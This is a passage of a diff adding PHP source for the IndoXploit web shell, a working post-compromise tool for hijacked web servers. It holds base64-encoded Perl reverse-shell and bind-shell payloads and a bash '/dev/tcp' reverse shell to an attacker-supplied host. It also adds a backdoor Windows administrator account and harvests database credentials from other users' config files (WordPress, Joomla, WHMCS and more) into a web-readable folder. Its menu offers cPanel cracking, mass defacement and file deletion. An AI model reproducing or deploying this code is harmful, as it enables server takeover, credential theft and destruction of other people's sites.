ZWNvbmZpZy50eHQiK0x4d957169be41a75F466C49F955024E0644992890lcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJpZHhfc3ltNDA0LyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8weDE5OTkudHh0Iik7DQoJY29weSgiaWR4X3N5bTQwNC9uZW11LnR4dCIsImlkeF9zeW00MDQvJHVzZXJueWEtJHR5cGVjb25maWcudHh0NDA0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBCeSAweDE5OTk8L3RpdGxlPjwvaGVhZD4iOw0KcHJpbnQgJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjU7IHVybD1pZHhfc3ltNDA0Ii8+JzsNCnByaW50ICc8Ym9ke0x4d957169be41a75F466C49F955024E0644992890gRGllPC9oMT4nOw0KcHJpbnQgJzxhIGhyZWY9ImlkeF9zeW00MDQiPktsaWsgRGlzaW5pPC9hPic7DQp1bmxpbmsoJDApOw==";
+					save("/tmp/symlink404.pl", "w", base64_decode($sym['code']));
+					exe("perl /tmp/symlink404.pl");
+					sleep(1);
+					@unlink("/tmp/symlink404.pl");
+					@unlink("passwd.txt");
+					@unlink("idx_sym404/pas.txt");
+					@unlink("idx_sym404/nemu.txt");
+				}
+
+				print "<div style='background: #ffffff; width: 100%; height: 100%'>";
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym404/' frameborder='0' scrolling='yes'></iframe>";
+				print "</div>";
+			}
+		}
+	}
+	elseif($toolsname === "network") {
+		$args = explode(" ", $args);
+
+		if($args[0] === "bc") {
+			if(empty($args[1])) die(color(1, 1, "Set Your IP for BackConnect!"));
+			if(empty($args[2])) die(color(1, 1, "Set Your PORT for BackConnect!"));
+			if(empty($args[3])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
+
+			if($args[3] === "bash") {
+				exe("/bin/bash -i >& /dev/tcp/".$args[1]."/".$args[2]." 0>&1");
+			}
+			elseif($args[3] === "perl") {
+				$bc['code'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVB0x4d957169be41a75F466C49F955024E0644992890AkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+				save("/tmp/bc.pl", "w", base64_decode($bc['code']));
+				$bc['exec'] = exe("perl /tmp/bc.pl ".$args[1]." ".$args[2]." 1>/dev/null 2>&1 &");
+				sleep(1);
+				print "<pre>".$bc['exec']."\n".exe("ps aux | grep bc.pl")."</pre>";
+				@unlink("/tmp/bc.pl");
+			}
+		}
+		elseif($args[0] === "bp") {
+			if(empty($args[1])) die(color(1, 1, "Set Your PORT for Bind Port!"));
+			if(empty($args[2])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
+
+			if($args[2] === "perl") {
+				$bp['code'] = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCx0x4d957169be41a75F466C49F955024E064499289029ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENP0x4d957169be41a75F466C49F955024E0644992890B7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09O0x4d957169be41a75F466C49F955024E0644992890sNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
+				save("/tmp/bp.pl", "w", base64_decode($bp['code']));
+				$bp['exec'] = exe("perl /tmp/bp.pl ".$args[1]." 1>/dev/null 2>&1 &");
+				sleep(1);
+				print "<pre>".$bp['exec']."\n".exe("ps aux | grep bp.pl")."</pre>";
+				@unlink("/tmp/bp.pl");
+			}
+		}
+		else {
+			print color(1, 1, "Unknown '".$args[0]."'");
+		}
+	}
+	elseif($toolsname === "krdp") {
+		$args = explode(" ", $args);
+
+		if(OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
+		if(preg_match("/indoxploit/", exe("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));
+
+		$add_user   = exe("net user indoxploit indoxploit /add");
+    	$add_groups1 = exe("net localgroup Administrators indoxploit /add");
+    	$add_groups2 = exe("net localgroup Administrator indoxploit /add");
+    	$add_groups3 = exe("net localgroup Administrateur indoxploit /add");
+
+    	print "[ RDP ACCOUNT INFO ]<br>
+    	------------------------------<br>
+    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
+    	Username: ".color(1, 2, "indoxploit")."<br>
+    	Password: ".color(1, 2, "indoxploit")."<br>
+    	------------------------------<br><br>
+    	[ STATUS ]<br>
+    	------------------------------<br>
+    	";
+
+    	if($add_user) {
+    		print "[add user] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	else {
+    		print "[add user] -> ".color(1, 1, "FAILED")."<br>";
+    	}
+    	
+    	if($add_groups1) {
+        	print "[add localgroup Administrators] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	elseif($add_groups2) {
+            print "[add localgroup Administrator] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	elseif($add_groups3) { 
+            print "[add localgroup Administrateur] -> ".color(1, 2, "SUCCESS")."<br>";
+    	} 
+    	else {
+    		print "[add localgroup] -> ".color(1, 1, "FAILED")."<br>";
+    	}
+
+    	print "------------------------------<br>";
+	}
+}
+
+function files_and_folder() {
+	if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
+	if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
+	print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
+		   <tr>
+		   <th class="th_home"><center>Name</center></th>
+		   <th class="th_home"><center>Type</center></th>
+		   <th class="th_home"><center>Size</center></th>
+		   <th class="th_home"><center>Last Modified</center></th>
+		   <th class="th_home"><center>Owner/Group</center></th>
+		   <th class="th_home"><center>Permission</center></th>
+		   <th class="th_home"><center>Action</center></th>
+		   </tr>';
+
+	if(function_exists('opendir')) {
+		if($opendir = opendir(path())) {
+			while(($readdir = readdir($opendir)) !== false) {
+				$dir[] = $readdir;
+			}
+			closedir($opendir);
+		}
+		sort($dir);
+	} else {
+		$dir = scandir(path());
+	}
+
+	foreach($dir as $folder) {
+		$dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
+		if(!is_dir($dirinfo['path'])) continue;
+		$dirinfo['type']  = filetype($dirinfo['path']);
+		$dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
+		$dirinfo['size']  = "-";
+		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
+		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
+		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>delete</a>";
+		if(function_exists('posix_getpwuid')) {
+			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
+			$dirinfo['owner'] = $dirinfo['owner']->name;
+		} else {
+			$dirinfo['owner'] = fileowner($dirinfo['path']);
+		}
+		if(function_exists('posix_getgrgid')) {
+			$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
+			$dirinfo['group'] = $dirinfo['group']->name;
+		} else {
+			$dirinfo['group'] = filegroup($dirinfo['path']);
+		}
+		print "<tr>";
+		print "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>".$dirinfo['link']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['type']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['size']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
+		print "<td class='td_home' style='padding-left: 15px;'>".$dirinfo['action']."</td>";
+		print "</tr>";
+	}
+	foreach($dir as $files) {
+		$fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
+		if(!is_file($fileinfo['path'])) continue;
+		$fileinfo['type'] = filetype($fileinfo['path']);
+		$fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
+		$fileinfo['size'] = filesize($fileinfo['path'])/1024;
+		$fileinfo['size'] = round($fileinfo['size'],3);
+		$fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
+		$fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
+		if(function_exists('posix_getpwuid')) {
+			$fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
+			$fileinfo['owner'] = $fileinfo['owner']->name;
+		} else {
+			$fileinfo['owner'] = fileowner($fileinfo['path']);
+		}
+		if(function_exists('posix_getgrgid')) {
+			$fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
+			$fileinfo['group'] = $fileinfo['group']->name;
+		} else {
+			$fileinfo['group'] = filegroup($fileinfo['path']);
+		}
+		print "<tr>";
+		print "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/P0x4d957169be41a75F466C49F955024E0644992890YII='><a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['type']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['size']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
+		print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
+		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>rename</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>delete</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>download</a></td>";
+		print "</tr>";
+	}
+
+	print "</table>";
+	print "<center>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'>".color(1, 2, "IndoXploit")."</a></center>";
+}
+
+
+function action() {
+	tools("upload");
+	tools("cmd");
+	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
+	print "<center>";
+	print "<ul>";
+	print "<li>[ <a href='?'>Home</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=jumping'>Jumping</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=config'>Config</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=fakeroot'>Fake Root</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=cpanel'>cPanel Crack</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=mpc'>Mass Password Change</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=mass'>Mass Deface/Delete</a> ]</li>";
+	print "<li>[ <a href='?dir=".path()."&do=zoneh'>Zone-H</a> ]</li>";
+	print "</ul>";
+	print "</center>";
+	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
+
+
+	if(isset($_GET['do'])) {
+		if($_GET['do'] === "cmd") {
+			if(isset($_POST['cmd'])) {
+				if(preg_match("/^rf (.*)$/", $_POST['cmd'], $match)) {
+					tools("readfile", $match[1]);
+				}
+				elseif(preg_match("/^spawn (.*)$/", $_POST['cmd'], $match)) {
+					tools("spawn", $match[1]);
+				}
+				elseif(preg_match("/^symlink\s?(.*)$/", $_POST['cmd'], $match)) {
+					tools("symlink", $match[1]);
+				}
+				elseif(preg_match("/^rvr (.*)$/", $_POST['cmd'], $match)) {
+					tools("network", $match[1]);
+				}
+				elseif(preg_match("/^krdp$/", $_POST['cmd'])) {
+					tools("krdp");
+				}
+				elseif(preg_match("/^logout$/", $_POST['cmd'])) {
+					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+					print "<script>window.location='?';</script>";
+				}
+				elseif(preg_match("/^killme$/", $_POST['cmd'])) {
+					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+					@unlink(__FILE__);
+					print "<script>window.location='?';</script>";
+				}
+				else {
+					print "<pre>".exe($_POST['cmd'])."</pre>";
+				}
+			}
+			else {
+				files_and_folder();
+			}
+		}
+		elseif($_GET['do'] === "jumping") {
+			$i = 0;
+			foreach(getuser() as $user) {
+				$path = "/home/$user/public_html";
+				if(is_readable($path)) {
+					$status = color(1, 2, "[R]");
+					if(is_writable($path)) {
+						$status = color(1, 2, "[RW]");
+					}
+					$i++;
+					print "$status <a href='?dir=$path'>".color(1, 4, $path)."</a>";
+					if(!function_exists('posix_getpwuid')) print "<br>";
+					if(!getdomainname()) print " => ".color(1, 1, "Can't get domain name")."<br>";
+					foreach(getdomainname() as $domain) {
+						$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
+						$userdomain = $userdomain->name;
+						if($userdomain === $user) {
+							print " => <a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
+							break;
+						}
+					}
+				}
+			}
+			print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i kamar di ".$GLOBALS['SERVERIP'])."</p>";
+		}
+		elseif($_GET['do'] === "config") {
+			if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_config'."));
+			if(!is_dir(path()."/idx_config/")) {
+				@mkdir('idx_config', 0755);
+				$htaccess = "Options all\nDirectoryIndex indoxploit.htm\nSatisfy Any";
+				save("idx_config/.htaccess","w", $htaccess);
+
+				foreach(getuser() as $user) {
+					$user_docroot = "/home/$user/public_html/";
+					if(is_readable($user_docroot)) {
+						$getconfig = array(
+							"/home/$user/.accesshash" => "WHM-accesshash",
+							"$user_docroot/config/koneksi.php" => "Lokomedia",
+							"$user_docroot/forum/config.php" => "phpBB",
+							"$user_docroot/sites/default/settings.php" => "Drupal",
+							"$user_docroot/config/settings.inc.php" => "PrestaShop",
+							"$user_docroot/app/etc/local.xml" => "Magento",
+							"$user_docroot/admin/config.php" => "OpenCart",
+							"$user_docroot/application/config/database.php" => "Ellislab",
+							"$user_docroot/vb/includes/config.php" => "Vbulletin",
+							"$user_docroot/includes/config.php" => "Vbulletin",
+							"$user_docroot/forum/includes/config.php" => "Vbulletin",
+							"$user_docroot/forums/includes/config.php" => "Vbulletin",
+							"$user_docroot/cc/includes/config.php" => "Vbulletin",
+							"$user_docroot/inc/config.php" => "MyBB",
+							"$user_docroot/includes/configure.php" => "OsCommerce",
+							"$user_docroot/shop/includes/configure.php" => "OsCommerce",
+							"$user_docroot/os/includes/configure.php" => "OsCommerce",
+							"$user_docroot/oscom/includes/configure.php" => "OsCommerce",
+							"$user_docroot/products/includes/configure.php" => "OsCommerce",
+							"$user_docroot/cart/includes/configure.php" => "OsCommerce",
+							"$user_docroot/inc/conf_global.php" => "IPB",
+							"$user_docroot/wp-config.php" => "Wordpress",
+							"$user_docroot/wp/test/wp-config.php" => "Wordpress",
+							"$user_docroot/blog/wp-config.php" => "Wordpress",
+							"$user_docroot/beta/wp-config.php" => "Wordpress",
+							"$user_docroot/portal/wp-config.php" => "Wordpress",
+							"$user_docroot/site/wp-config.php" => "Wordpress",
+							"$user_docroot/wp/wp-config.php" => "Wordpress",
+							"$user_docroot/WP/wp-config.php" => "Wordpress",
+							"$user_docroot/news/wp-config.php" => "Wordpress",
+							"$user_docroot/wordpress/wp-config.php" => "Wordpress",
+							"$user_docroot/test/wp-config.php" => "Wordpress",
+							"$user_docroot/demo/wp-config.php" => "Wordpress",
+							"$user_docroot/home/wp-config.php" => "Wordpress",
+							"$user_docroot/v1/wp-config.php" => "Wordpress",
+							"$user_docroot/v2/wp-config.php" => "Wordpress",
+							"$user_docroot/press/wp-config.php" => "Wordpress",
+							"$user_docroot/new/wp-config.php" => "Wordpress",
+							"$user_docroot/blogs/wp-config.php" => "Wordpress",
+							"$user_docroot/configuration.php" => "Joomla",
+							"$user_docroot/blog/configuration.php" => "Joomla",
+							"$user_docroot/submitticket.php" => "^WHMCS",
+							"$user_docroot/cms/configuration.php" => "Joomla",
+							"$user_docroot/beta/configuration.php" => "Joomla",
+							"$user_docroot/portal/configuration.php" => "Joomla",
+							"$user_docroot/site/configuration.php" => "Joomla",
+							"$user_docroot/main/configuration.php" => "Joomla",
+							"$user_docroot/home/configuration.php" => "Joomla",
+							"$user_docroot/demo/configuration.php" => "Joomla",
+							"$user_docroot/test/configuration.php" => "Joomla",
+							"$user_docroot/v1/configuration.php" => "Joomla",
+							"$user_docroot/v2/configuration.php" => "Joomla",
+							"$user_docroot/joomla/configuration.php" => "Joomla",
+							"$user_docroot/new/configuration.php" => "Joomla",
+							"$user_docroot/WHMCS/submitticket.php" => "WHMCS",
+							"$user_docroot/whmcs1/submitticket.php" => "WHMCS",
+							"$user_docroot/Whmcs/submitticket.php" => "WHMCS",
+							"$user_docroot/whmcs/submitticket.php" => "WHMCS",
+							"$user_docroot/whmcs/submitticket.php" => "WHMCS",
+							"$user_docroot/WHMC/submitticket.php" => "WHMCS",
+							"$user_docroot/Whmc/submitticket.php" => "WHMCS",
+							"$user_docroot/whmc/submitticket.php" => "WHMCS",
+							"$user_docroot/WHM/submitticket.php" => "WHMCS",
+							"$user_docroot/Whm/submitticket.php" => "WHMCS",
+							"$user_docroot/whm/submitticket.php" => "WHMCS",
+							"$user_docroot/HOST/submitticket.php" => "WHMCS",
+							"$user_docroot/Host/submitticket.php" => "WHMCS",
+							"$user_docroot/host/submitticket.php" => "WHMCS",
+							"$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
+							"$user_docroot/Supportes/submitticket.php" => "WHMCS",
+							"$user_docroot/supportes/submitticket.php" => "WHMCS",
+							"$user_docroot/domains/submitticket.php" => "WHMCS",
+							"$user_docroot/domain/submitticket.php" => "WHMCS",
+							"$user_docroot/Hosting/submitticket.php" => "WHMCS",
+							"$user_docroot/HOSTING/submitticket.php" => "WHMCS",
+							"$user_docroot/hosting/submitticket.php" => "WHMCS",
+							"$user_docroot/CART/submitticket.php" => "WHMCS",
+							"$user_docroot/Cart/submitticket.php" => "WHMCS",
+							"$user_docroot/cart/submitticket.php" => "WHMCS",
+							"$user_docroot/ORDER/submitticket.php" => "WHMCS",
+							"$user_docroot/Order/submitticket.php" => "WHMCS",
+							"$user_docroot/order/submitticket.php" => "WHMCS",
+							"$user_docroot/CLIENT/submitticket.php" => "WHMCS",
+							"$user_docroot/Client/submitticket.php" => "WHMCS",
+							"$user_docroot/client/submitticket.php" => "WHMCS",
+							"$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
+							"$user_docroot/Clientarea/submitticket.php" => "WHMCS",
+							"$user_docroot/clientarea/submitticket.php" => "WHMCS",
+							"$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
+							"$user_docroot/Support/submitticket.php" => "WHMCS",
+							"$user_docroot/support/submitticket.php" => "WHMCS",
+							"$user_docroot/BILLING/submitticket.php" => "WHMCS",
+							"$user_docroot/Billing/submitticket.php" => "WHMCS",
+							"$user_docroot/billing/submitticket.php" => "WHMCS",
+							"$user_docroot/BUY/submitticket.php" => "WHMCS",
+							"$user_docroot/Buy/submitticket.php" => "WHMCS",
+							"$user_docroot/buy/submitticket.php" => "WHMCS",
+							"$user_docroot/MANAGE/submitticket.php" => "WHMCS",
+							"$user_docroot/Manage/submitticket.php" => "WHMCS",
+							"$user_docroot/manage/submitticket.php" => "WHMCS",
+							"$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
+							"$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
+							"$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
+							"$user_docroot/clientsupport/submitticket.php" => "WHMCS",
+							"$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
+							"$user_docroot/Checkout/submitticket.php" => "WHMCS",
+							"$user_docroot/checkout/submitticket.php" => "WHMCS",
+							"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
+							"$user_docroot/Billings/submitticket.php" => "WHMCS",
+							"$user_docroot/billings/submitticket.php" => "WHMCS",
+							"$user_docroot/BASKET/submitticket.php" => "WHMCS",
+							"$user_docroot/Basket/submitticket.php" => "WHMCS",
+							"$user_docroot/basket/submitticket.php" => "WHMCS",
+							"$user_docroot/SECURE/submitticket.php" => "WHMCS",
+							"$user_docroot/Secure/submitticket.php" => "WHMCS",
+							"$user_docroot/secure/submitticket.php" => "WHMCS",
+							"$user_docroot/SALES/submitticket.php" => "WHMCS",
+							"$user_docroot/Sales/submitticket.php" => "WHMCS",
+							"$user_docroot/sales/submitticket.php" => "WHMCS",
+							"$user_docroot/BILL/submitticket.php" => "WHMCS",
+							"$user_docroot/Bill/submitticket.php" => "WHMCS",
+							"$user_docroot/bill/submitticket.php" => "WHMCS",
+							"$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
+							"$user_docroot/Purchase/submitticket.php" => "WHMCS",
+							"$user_docroot/purchase/submitticket.php" => "WHMCS",
+							"$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
+							"$user_docroot/Account/submitticket.php" => "WHMCS",
+							"$user_docroot/account/submitticket.php" => "WHMCS",
+							"$user_docroot/USER/submitticket.php" => "WHMCS",
+							"$user_docroot/User/submitticket.php" => "WHMCS",
+							"$user_docroot/user/submitticket.php" => "WHMCS",
+							"$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
+							"$user_docroot/Clients/submitticket.php" => "WHMCS",
+							"$user_docroot/clients/submitticket.php" => "WHMCS",
+							"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
+							"$user_docroot/Billings/submitticket.php" => "WHMCS",
+							"$user_docroot/billings/submitticket.php" => "WHMCS",
+							"$user_docroot/MY/submitticket.php" => "WHMCS",
+							"$user_docroot/My/submitticket.php" => "WHMCS",
+							"$user_docroot/my/submitticket.php" => "WHMCS",
+							"$user_docroot/secure/whm/submitticket.php" => "WHMCS",
+							"$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
+							"$user_docroot/panel/submitticket.php" => "WHMCS",
+							"$user_docroot/clientes/submitticket.php" => "WHMCS",
+							"$user_docroot/cliente/submitticket.php" => "WHMCS",
+							"$user_docroot/support/order/submitticket.php" => "WHMCS",
+							"$user_docroot/bb-config.php" => "BoxBilling",
+							"$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
+							"$user_docroot/box/bb-config.php" => "BoxBilling",
+							"$user_docroot/host/bb-config.php" => "BoxBilling",
+							"$user_docroot/Host/bb-config.php" => "BoxBilling",
+							"$user_docroot/supportes/bb-config.php" => "BoxBilling",
+							"$user_docroot/support/bb-config.php" => "BoxBilling",
+							"$user_docroot/hosting/bb-config.php" => "BoxBilling",
+							"$user_docroot/cart/bb-config.php" => "BoxBilling",
+							"$user_docroot/order/bb-config.php" => "BoxBilling",
+							"$user_docroot/client/bb-config.php" => "BoxBilling",
+							"$user_docroot/clients/bb-config.php" => "BoxBilling",
+							"$user_docroot/cliente/bb-config.php" => "BoxBilling",
+							"$user_docroot/clientes/bb-config.php" => "BoxBilling",
+							"$user_docroot/billing/bb-config.php" => "BoxBilling",
+							"$user_docroot/billings/bb-config.php" => "BoxBilling",
+							"$user_docroot/my/bb-config.php" => "BoxBilling",
+							"$user_docroot/secure/bb-config.php" => "BoxBilling",
+							"$user_docroot/support/order/bb-config.php" => "BoxBilling",
+							"$user_docroot/includes/dist-configure.php" => "Zencart",
+							"$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
+							"$user_docroot/products/includes/dist-configure.php" => "Zencart",
+							"$user_docroot/cart/includes/dist-configure.php" => "Zencart",
+							"$user_docroot/shop/includes/dist-configure.php" => "Zencart",
+							"$user_docroot/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/host/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/Host/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/support/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/cart/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/order/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/client/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/clients/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/billing/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/billings/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/my/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/secure/includes/iso4217.php" => "Hostbills",
+							"$user_docroot/support/order/includes/iso4217.php" => "Hostbills"
+
+						);
+						foreach($getconfig as $config => $userconfig) {
+							$get = file_get_contents($config);
+							if($get == '') {
+							}
+							else {
+								$fopen = fopen("idx_config/$user-$userconfig.txt", "w");
+								fputs($fopen, $get);
+							}
+						}
+					}
+				}
+			}
+			print "<div style='background: #ffffff; width: 100%; height: 100%'>";
